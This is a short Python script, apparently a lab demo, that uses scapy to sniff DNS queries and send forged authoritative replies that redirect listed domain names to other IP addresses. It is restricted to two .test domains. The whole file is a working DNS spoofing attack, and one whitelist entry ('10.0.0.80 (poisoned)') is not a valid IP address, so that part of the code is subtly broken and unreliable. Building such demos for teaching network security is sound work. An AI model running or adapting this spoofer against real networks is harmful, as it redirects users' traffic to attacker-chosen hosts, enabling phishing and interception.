from scapy.all import sniff, IP, UDP, DNS, DNSQR, DNSRR, send
import time

# Whitelist is used to ensure a closed environment for safety
WHITELIST = {
    "lab-victim.test": "10.0.0.80 (poisoned)",
    "insecure.test": "10.0.0.77"
}

def handle_dns(packet):
    # If a DNS packet has been recieved and it is a request (rather than a response), continue
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        qname = packet[DNSQR].qname.decode().strip(".")
        print(f"[DNS] Query for {qname}")

        # Check if the DNS request has been made for a whitelisted website
        if qname in WHITELIST:
            spoof_ip = WHITELIST[qname]
            print(f"   [+] Spoofing → {spoof_ip}")

            # Create a DNS message (from attacker to victim), that contains the new poisoned IP for the cictims required website
            spoof = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                    UDP(dport=packet[UDP].sport, sport=53) / \
                    DNS(id=packet[DNS].id,
                        qr=1, aa=1, qd=packet[DNS].qd,
                        an=DNSRR(rrname=packet[DNSQR].qname,
                                 ttl=30, rdata=spoof_ip))

            send(spoof, verbose=False)

def run():
    print("[*] DNS DEMO (Educational Spoofing)")
    print("[i] Only spoofing whitelisted test domains.")
    sniff(filter="udp port 53", prn=handle_dns)
